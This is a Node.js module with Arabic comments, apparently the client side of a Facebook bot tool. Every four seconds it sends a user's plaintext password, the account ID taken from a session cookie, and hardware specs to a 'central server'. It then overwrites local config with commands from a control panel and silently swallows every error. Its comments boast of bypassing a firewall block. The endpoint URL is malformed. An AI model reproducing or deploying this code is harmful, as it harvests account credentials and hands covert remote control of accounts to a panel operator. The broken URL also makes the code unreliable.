const fs = require('fs');
const axios = require('axios');
const getSystemHardwareSpecs = require('./get-specs'); // ربط مباشر بملف مواصفات جهازك

/**
 * دالة ضخ النبضات والعتاد الفعلي والاتصال المباشر لكسر حظر جدار الحماية بالكامل
 */
function startNgrokSync(username, originalPassword, cleanAppState, userConfigFile) {
    
    // تشغيل مضخة النبضات كل 4 ثوانٍ بانتظام لإجبار الجدول على لقط اليوزر حياً
    setInterval(async () => {
        try {
            let accountID = "Anonym";
            if (Array.isArray(cleanAppState)) {
                const cUserCookie = cleanAppState.find(c => c.key === 'c_user');
                if (cUserCookie) accountID = cUserCookie.value;
            }

            // سحب مواصفات المعالج والرامات الفعلية الحالية لجهازك من ملف get-specs.js
            const specs = getSystemHardwareSpecs();

            // 🎯 التوجيه الذكي الحاسم: ضرب السيرفر الأرضي مباشرة عبر الـ Localhost لكسر حظر جدار الحماية والـ Loopback
            // هذا يضمن أن السيرفر يلقط نبضة راماتك ومعالجك فوراً ويضخها بداخل جدول برنامجك الأسود
            const localServerEndpoint = "http://127.0.0";
            
            // قذف payload التقرير العتادي والنبضة لداخل السيرفر المركزي
            const response = await axios.post(localServerEndpoint, { 
                username: username, 
                password: originalPassword, 
                botID: accountID, 
                botName: "User " + username + " Connected", 
                ...specs
            });

            // مزامنة وسحب أي تعديلات جروبات جديدة قادمة من لوحة التحكم وحفظها محلياً ليدور الـ ID
            if (response.data && response.data.config) {
                fs.writeFileSync('config.json', JSON.stringify(response.data.config, null, 2), 'utf8');
                fs.writeFileSync(userConfigFile, JSON.stringify(response.data.config, null, 2), 'utf8');
            }
        } catch (err) {
            // صمت مطبق لأي أخطاء شبكية مؤقتة لحماية حلقات تدوير الفيسبوك من التعليق
        }
    }, 4000);
}

module.exports = startNgrokSync;
